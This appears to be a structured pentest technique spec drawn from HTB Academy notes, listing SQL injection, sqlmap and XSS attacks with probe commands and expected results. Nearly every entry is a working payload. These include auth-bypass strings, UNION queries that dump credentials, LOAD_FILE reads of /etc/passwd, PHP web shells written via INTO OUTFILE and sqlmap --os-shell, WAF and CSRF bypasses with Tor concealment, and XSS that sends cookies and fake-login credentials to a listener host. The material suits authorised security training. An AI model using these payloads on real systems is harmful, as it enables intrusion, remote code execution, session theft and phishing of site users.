# vault-injection — technique spec distilled from HTB-Academy Pentester Path notes (SQL Attacks / SQL Map / XSS)

## TECH: sqli-quote-error-probe
- vault: SQL Attacks/03-SQLi-Fundamentals.md
- class: auto
- when: any user-controlled input reaching a query — URL param present, form field present, or search box present
- probe: append each discovery payload to {PARAM} (URL-encoded form for GET): `'`=%27 `"`=%22 `#`=%23 `;`=%3B `)`=%29 — e.g. `curl '{URL}?{PARAM}=%27'`; sqlmap heuristic equivalent sends an intentionally invalid value like `{PARAM}=1",)..)`
- detect: SQL syntax error reflected in response, verbatim: `Error: near line 1: near "'": syntax error` (unbalanced quote count); any DB error string in body confirms potential injection point
- sev: high

## TECH: sqli-dbms-fingerprint
- vault: SQL Attacks/06-Database-Enumeration.md
- class: auto
- when: injection point suspected (error or behavior change on quote probe) and DBMS unknown; weak prior: Apache/Nginx→MySQL, IIS→MSSQL (always verify)
- probe: `SELECT @@version` (full output visible — expect MySQL/MariaDB version string); `SELECT POW(1,1)` (numeric output only — expect `1`); `SELECT SLEEP(5)` (blind — expect ~5s delay + return `0`); union form: `cn' UNION select 1,@@version,3,4-- -`
- detect: version string like `10.3.22-MariaDB-1ubuntu1` confirms MariaDB; POW returns `1`/SLEEP delays on MySQL-family, error or no delay on other DBMS
- sev: low

## TECH: sqli-union-column-count
- vault: SQL Attacks/05-Union-Based-Injection.md
- class: auto
- when: error-based injection confirmed on a {PARAM} whose query output is rendered on-page
- probe: ORDER BY increment until error: `'{VAL}' order by 1-- -` … `order by 5-- -` (errors at N = table has N-1 columns); or UNION increment: `cn' UNION select 1,2,3-- -` then `cn' UNION select 1,2,3,4-- -` until success (ORDER BY always succeeds until it errors; UNION always errors until it succeeds)
- detect: column-count mismatch error verbatim: `ERROR 1222 (21000): The used SELECT statements have a different number of columns`; first non-erroring UNION count = true column count
- sev: med

## TECH: sqli-boolean-blind-diff
- vault: SQL Map/02-SQL-Injection-Types.md
- class: auto
- when: param is dynamic (value change alters response) but no output/echo — content stable across identical requests
- probe: `{URL}?{PARAM}=1' AND 1=1-- -` vs `{URL}?{PARAM}=1' AND 1=2-- -` (1 bit per request, ~7-8 requests/char to extract)
- detect: TRUE request ≈ regular response (marginal/no difference); FALSE request shows substantial differences (content, HTTP code, or title); a constant string reliably present only on TRUE (sqlmap reports e.g. `appears to be '...' injectable (with --string="luther")`)
- sev: high

## TECH: sqli-auth-bypass-or-comment
- vault: SQL Attacks/04-Subverting-Query-Logic.md
- class: manual
- when: login form present (username + password fields feeding a WHERE clause)
- probe: username `admin' or '1'='1` (AND binds tighter than OR); password-field variant `something' or '1'='1`; comment variant username `admin'-- ` (trailing space required; URL-encode `--+` or `-- -`; `#` as `%23`); parenthesized-query variant `admin')--` (close paren before commenting — plain `admin'--` throws unbalanced-parenthesis syntax error)
- detect: successful login as admin (or first-row user) without valid password; no SQL syntax error = payload matched query structure
- sev: high

## TECH: sqli-union-enumeration
- vault: SQL Attacks/06-Database-Enumeration.md, SQL Attacks/05-Union-Based-Injection.md
- class: manual
- when: union injection confirmed + column count known; find reflected positions with `cn' UNION select 1,2,3,4-- -` (only positions that render on-page, e.g. 2,3,4)
- probe: version confirm `cn' UNION select 1,@@version,3,4-- -`; current DB `cn' UNION select 1,database(),2,3-- -`; list DBs `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`; tables `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='{DB}'-- -`; columns `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='{TABLE}'-- -`; dump `cn' UNION select 1, username, password, 4 from {DB}.{TABLE}-- -` (dot operator required cross-DB)
- detect: version string / schema names / credential rows rendered in the reflected UNION column positions; ignore default DBs `mysql`, `information_schema`, `performance_schema`, `sys`
- sev: high

## TECH: sqli-privilege-check
- vault: SQL Attacks/07-File-Read-Write.md
- class: manual
- when: union enumeration working; before attempting file read/write
- probe: current user `cn' UNION SELECT 1, user(), 3, 4-- -` (also `cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`); superuser `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`; full privileges `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'{USER}'@'localhost'"-- -`; secure_file_priv `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name='secure_file_priv'-- -`
- detect: `root` as user and `Y` for super_priv = DBA; `FILE` listed in privilege_type = file read (maybe write); secure_file_priv empty=anywhere, path=restricted to dir, NULL=disabled
- sev: med

## TECH: sqli-file-read-loadfile
- vault: SQL Attacks/07-File-Read-Write.md
- class: manual
- when: DB user confirmed to hold FILE privilege
- probe: `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`; source code read `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/{PAGE}.php"), 3, 4-- -` (use Ctrl+U view-source — browser may render PHP as HTML); web root discovery via `LOAD_FILE('/etc/apache2/apache2.conf')` / `/etc/nginx/nginx.conf` / `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`
- detect: passwd file contents or PHP source rendered in the UNION output position (OS user running MySQL must have read perm on target file)
- sev: high

## TECH: sqli-file-write-webshell
- vault: SQL Attacks/07-File-Read-Write.md
- class: manual
- when: FILE privilege + secure_file_priv not restrictive + OS write access to web root
- probe: test write `cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -` (verify by browsing /proof.txt); web shell `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`; trigger `curl '{URL}/shell.php?0=id'` (base64 for binary/long content via `FROM_BASE64("base64_data")`)
- detect: proof.txt retrievable; command output like `uid=33(www-data)` from shell.php = full RCE as web server user
- sev: high

## TECH: sqlmap-basic-scan
- vault: SQL Map/03-Getting-Started-and-Basic-Scenario.md, SQL Map/01-SQLMap-Overview-and-Installation.md
- class: manual
- when: URL with at least one GET param present ({PARAM} dynamic, error messages reflected)
- probe: `sqlmap -u "{URL}?{PARAM}=1" --batch` (—batch skips interactive prompts; needs ≥1 param, or auto-discover via `--crawl`, `--forms`, `-g`)
- detect: result block `Parameter: {PARAM} (GET)` listing `Type: boolean-based blind` / `Type: error-based` / `Type: time-based blind` / `Type: UNION query`; back-end DBMS line e.g. `MySQL >= 5.0`; bonus heuristic line `heuristic (XSS) test shows... might be vulnerable to XSS`; final `sqlmap identified the following injection point(s) with a total of N HTTP(s) requests` = provably exploitable
- sev: high

## TECH: sqlmap-request-file
- vault: SQL Map/05-Running-SQLMap-on-HTTP-Requests.md
- class: manual
- when: complex request — auth session/cookies required, POST body, JSON/XML endpoint found, or many headers (most false negatives come from misconfigured requests)
- probe: save raw request (Burp "Copy to file") then `sqlmap -r req.txt`; mark injection point inside file with `*` (e.g. `/?id=*`); curl-style paste: `sqlmap '{URL}' -H 'User-Agent: Mozilla/5.0 ...' -H 'Accept: image/webp,*/*' --compressed`; POST: `sqlmap '{URL}' --data '{PARAM}=1&name=test'`; narrow `-p {PARAM}` or star inline `--data 'uid=1*&name=test'`; header injection `--cookie="id=1*"`; custom UA/headers `-A/--user-agent`, `--random-agent`, `--host`, `--referer`, `--method PUT`
- detect: `JSON data found in HTTP body. Do you want to process it? [Y/n/q]` prompt for JSON bodies; injection point confirmed lines as in basic scan
- sev: high

## TECH: sqlmap-level-risk-tuning
- vault: SQL Map/07-Attack-Tuning.md
- class: manual
- when: default scan finds nothing, or non-standard injection context (LIKE-wrapped, parentheses, header); OR raise --risk for login forms needing OR-based payloads (can modify data on non-SELECT statements)
- probe: `sqlmap -u "{URL}?{PARAM}=1" -v 3 --level=5` (default level=1/risk=1 ≈ 72 payloads; level=5/risk=3 up to 7,865 — don't max casually); custom boundaries `sqlmap -u "{URL}?q=test" --prefix="%'))" --suffix="-- -"`; narrow `--technique=BEU` (letters B/E/U/S/T/Q = boolean/error/union/stacked/time/inline; skip time-based if causing timeouts); UNION tuning `--union-cols=17`, `--union-char='a'`, `--union-from=users` (Oracle needs FROM); comparison tuning `--code=200`, `--titles`, `--string=success`, `--text-only`
- detect: `[PAYLOAD]` lines at `-v 3`+ show exact vectors tried; confirmed injection point lines after extended testing
- sev: med

## TECH: sqlmap-tamper-bypass
- vault: SQL Map/10-Bypassing-Web-App-Protections.md
- class: manual
- when: WAF/IPS detected blocking payloads (sqlmap WAF probe on non-existent param; ModSecurity responds `406 - Not Acceptable`; identYwaf fingerprints 80 WAF products)
- probe: `sqlmap -u "{URL}?{PARAM}=1" --tamper=between,randomcase` (chainable, run in priority order); list all with `--list-tampers`; notable: `between` (`>`→`NOT BETWEEN 0 AND #`, `=`→`BETWEEN # AND #`), `space2comment` (space→`/**/`), `space2plus`, `space2dash`, `space2hash`, `randomcase`, `base64encode`, `percentage`, `equaltolike` (`=`→`LIKE`), `symboliclogical` (AND/OR→`&&`/`||`), `modsecurityversioned`/`modsecurityzeroversioned`, `halfversionedmorekeywords`, `versionedkeywords`, `versionedmorekeywords`, `commalesslimit`, `plus2concat` (MSSQL), `space2mssqlblank` (MSSQL); also `--chunked` (split POST body so blacklisted keywords aren't seen whole); HPP: `?{PARAM}=1&{PARAM}=UNION&{PARAM}=SELECT&...` (relies on e.g. ASP concatenating repeated params)
- detect: previously-blocked payloads now returning normal app responses / injection confirmed; absence of WAF block page (`406 - Not Acceptable`)
- sev: high

## TECH: sqlmap-anti-automation-bypass
- vault: SQL Map/10-Bypassing-Web-App-Protections.md
- class: manual
- when: request protection present — CSRF token param (name containing `csrf`/`xsrf`/`token`), per-request unique params, calculated params, UA blacklist, IP-level blocking
- probe: `sqlmap -u "{URL}" --data="id=1&csrftoken=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`; unique value `--randomize=rp` on `{URL}?id=1&rp=29125`; calculated `--eval="import hashlib; h=hashlib.md5(id).hexdigest()"`; UA blacklist → `--random-agent` (default `sqlmap/1.4.9.12#dev` UA commonly auto-dropped); IP concealment `--proxy="socks4://<ip>:<port>"`, `--proxy-file`, `--tor` + `--check-tor`; reduce noise `--skip-waf`
- detect: scan proceeds past the protection (no token-rejection/redirect-to-login responses); injection confirmed lines
- sev: med

## TECH: sqlmap-troubleshoot
- vault: SQL Map/06-Handling-SQLMap-Errors.md
- class: manual
- when: scan misbehaves, silent, or false-negative (common causes: expired cookie, complex one-liner instead of `-r`, malformed JSON/XML body, WAF interference, wrong technique)
- probe: `sqlmap -u "{URL}?{PARAM}=1" --parse-errors`; full traffic log `sqlmap -u "{URL}?{PARAM}=1" --batch -t /tmp/traffic.txt` then `cat /tmp/traffic.txt`; verbosity `sqlmap -u "{URL}?{PARAM}=1" -v 6 --batch` (0-6, default 1; `-v 3`+ shows `[PAYLOAD]` lines); proxy through Burp `--proxy="http://127.0.0.1:8080"`
- detect: `[WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error...'` printed inline reveals why payloads fail; TRAFFIC OUT/IN blocks show exact requests
- sev: low

## TECH: sqlmap-db-enum
- vault: SQL Map/08-Database-Enumeration.md
- class: manual
- when: injection confirmed by prior sqlmap run (session resumes: `resuming back-end DBMS 'mysql'`)
- probe: `sqlmap -u "{URL}?{PARAM}=1" --banner --current-user --current-db --is-dba`; tables `--tables -D {DB}`; dump `--dump -T {TABLE} -D {DB}`; columns `-C name,surname`; rows `--start=2 --stop=3`; filter `--where="name LIKE 'f%'"`; whole DB `--dump -D {DB}`; everything `--dump-all --exclude-sysdbs` (skip system DBs; dump saved as CSV, `--dump-format` → HTML/SQLite)
- detect: banner/current-user/current-db printed in console; `current user is DBA: True|False`; CSV files under `~/.sqlmap/output/{TARGET}/`; hash values trigger cracking prompt (~31 hash types, ~1.4M-entry wordlist `/usr/local/share/sqlmap/data/txt/wordlist.tx_`)
- sev: high

## TECH: sqlmap-advanced-enum
- vault: SQL Map/09-Advanced-Database-Enumeration.md
- class: manual
- when: injection confirmed + need schema overview, unknown table/column names, or DB-level credentials
- probe: full schema `sqlmap -u "{URL}?{PARAM}=1" --schema`; search `--search -T user` / `--search -C pass` (LIKE-based, prompts to dump matches); DB user passwords `--passwords --batch`; everything `sqlmap -u "..." --all --batch` (long-running, retrieves everything accessible)
- detect: schema tree (DBs/tables/columns) printed; matched table names on --search; DB-level users e.g. `root`, `debian-sys-maint` with crackable password hashes
- sev: high

## TECH: sqlmap-file-read
- vault: SQL Map/11-OS-Exploitation.md
- class: manual
- when: injection confirmed and `--is-dba` shows `current user is DBA: True` (False → file read likely fails with `[ERROR] no data retrieved`)
- probe: `sqlmap -u "{URL}?{PARAM}=1" --file-read "/etc/passwd"`; if retrieval struggles add `--no-cast` or `--hex`; output saved to `~/.sqlmap/output/{TARGET}/files/_etc_passwd` (verify with `cat`)
- detect: file contents printed/stored locally; MySQL requires LOAD DATA + INSERT privileges for the equivalent `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`
- sev: high

## TECH: sqlmap-file-write-osshell
- vault: SQL Map/11-OS-Exploitation.md
- class: manual
- when: DBA privileges confirmed and DBMS file-write not disabled (MySQL needs secure-file-priv disabled server-side)
- probe: stage shell `echo '<?php system($_GET["cmd"]); ?>' > shell.php`; write `sqlmap -u "{URL}?{PARAM}=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`; trigger `curl "{URL}/shell.php?cmd=ls+-la"`; or direct interactive shell `sqlmap -u "{URL}?{PARAM}=1" --os-shell` (`--batch` auto-accepts language=PHP, path disclosure, common locations `/var/www/`, `/var/www/html`; if `No output`, retry `--os-shell --technique=E`)
- detect: `os-shell>` prompt with command output (`ls -la` listing, `total 156 drwxrwxrwt 1 www-data www-data ...`) = full interactive RCE; uploaded shell.php responding to cmd param
- sev: high

## TECH: xss-input-inventory
- vault: XSS/XSS-05-XSS-Discovery.md
- class: auto
- when: any web page with input surface — initial recon before payload testing
- probe: enumerate every input reflected on the page: form fields, URL params, and HTTP headers (`Cookie`, `User-Agent`) if their values are ever displayed back; submit benign `test` and grep response for reflection; passive code review for DOM sources/sinks
- detect: raw input echoed unescaped anywhere in response HTML (or rendered DOM) = candidate reflection point; reflected payload ≠ execution — always manually verify
- sev: low

## TECH: xss-reflected-canary
- vault: XSS/XSS-03-Reflected-XSS.md
- class: auto
- when: input echoed back unsanitized in same-response context — error/confirmation message e.g. `Task 'test' could not be added.`
- probe: submit `<script>alert(window.origin)</script>` into {PARAM}; confirm in page source (Ctrl+U): `<div style="padding-left:25px">Task '<script>alert(window.origin)</script>' could not be added.</div>`; victim URL form: `{URL}/index.php?{PARAM}=<script>alert(window.origin)</script>`
- detect: alert popup firing (window.origin reveals which origin/iframe executed it); payload visible raw in HTML source; error message shows empty quotes `Task '' could not be added.` because script executes instead of rendering; re-visit without payload → gone = non-persistent confirmed
- sev: med

## TECH: xss-stored-canary
- vault: XSS/XSS-02-Stored-XSS.md
- class: auto
- when: input persisted server-side and re-displayed — comment/post/review/todo fields whose value survives navigation
- probe: submit `<script>alert(window.origin)</script>`; alternates when alert() is blocked: `<plaintext>` (stops rendering, displays raw text after it) and `<script>print()</script>` (opens print dialog, rarely blocked)
- detect: alert fires on first submit AND on every page refresh (persistence = Stored XSS, most critical type — affects every visitor); raw payload visible in stored HTML: `<ul><script>alert(window.origin)</script></ul>`
- sev: high

## TECH: xss-dom-canary
- vault: XSS/XSS-04-DOM-XSS.md
- class: auto
- when: page JS reads URL into DOM — param after `#` fragment, or input triggers no HTTP request in Network tab; JS sinks present: `document.write()`, `DOM.innerHTML`, `DOM.outerHTML`, jQuery `add()`/`after()`/`append()`
- probe: deliver via URL fragment: `{URL}/#task=<img src="" onerror=alert(window.origin)>` (standard `<script>` tags don't execute through innerHTML — use event-handler vectors like img onerror with deliberately broken src)
- detect: alert fires; input nowhere in raw page source (Ctrl+U) but visible in rendered inspector (Ctrl+Shift+C); no request to back-end in Network tab
- sev: med

## TECH: xss-blind-remote-script
- vault: XSS/XSS-08-Session-Hijacking-and-Blind-XSS.md
- class: manual
- when: input renders on a page you can't view — contact forms, reviews, user details, support tickets, User-Agent header on admin panels
- probe: start listener `mkdir /tmp/tmpserver && cd /tmp/tmpserver && sudo php -S 0.0.0.0:80`; inject per-field payload encoding field name into requested path: `<script src="http://{LISTENER}/username"></script>`; candidates: `<script src=http://{LISTENER}></script>`, `'><script src=http://{LISTENER}></script>`, `"><script src=http://{LISTENER}></script>`, `javascript:eval('var a=document.createElement(\'script\');a.src=\'http://{LISTENER}\';document.body.appendChild(a)')`, `<script>$.getScript("http://{LISTENER}")</script>`; skip strictly-validated (email) and hashed (password) fields
- detect: HTTP hit on listener for `/{FIELDNAME}` = simultaneously confirms vulnerable field AND working payload (blind — can't confirm visually)
- sev: high

## TECH: xss-session-hijack-cookie
- vault: XSS/XSS-08-Session-Hijacking-and-Blind-XSS.md
- class: manual
- when: confirmed working XSS payload + victim session to steal (cookie without HttpOnly flag)
- probe: host `script.js` on listener: `new Image().src='http://{LISTENER}/index.php?c='+document.cookie` (prefer over `document.location='http://{LISTENER}/index.php?c='+document.cookie;` — no visible navigation); inject `<script src=http://{LISTENER}/script.js></script>`; collector index.php logs `Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}` per cookie split on `;` to cookies.txt
- detect: two listener hits — `/script.js` then `/index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2`; load stolen cookie via Firefox Storage tab (Shift+F9) → refresh → authenticated as victim
- sev: high

## TECH: xss-phishing-fake-login
- vault: XSS/XSS-07-Phishing-Attacks.md
- class: manual
- when: reflected XSS confirmed on a page with a legitimate form (e.g. image viewer `/phishing/index.php?url=` where basic alert payload may not execute — check render context first)
- probe: inject `document.write('<h3>Please login to continue</h3><form action=http://{LISTENER}><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();` and append `<!--` to comment out leftover HTML; capture with `sudo nc -lvnp 80` or PHP logger that writes creds.txt and `header("Location: {URL}/phishing/index.php")` redirects victim back, served via `sudo php -S 0.0.0.0:80`
- detect: listener receives `Username: test | Password: test`; victim silently redirected to legit page
- sev: high

## TECH: xss-defacement
- vault: XSS/XSS-06-Defacing-Attacks.md
- class: manual
- when: stored XSS confirmed (needs persistence to hit every visitor)
- probe: `<script>document.body.style.background = "#141d2b"</script>`; background image `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`; title `<script>document.title = 'HackTheBox Academy'</script>`; body text `<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1></center>'</script>` (or jQuery `$("#todo").html('New Text');`)
- detect: page appearance changed for all visitors, persists across refreshes; injected scripts append after original code — final rendered state is what matters
- sev: med
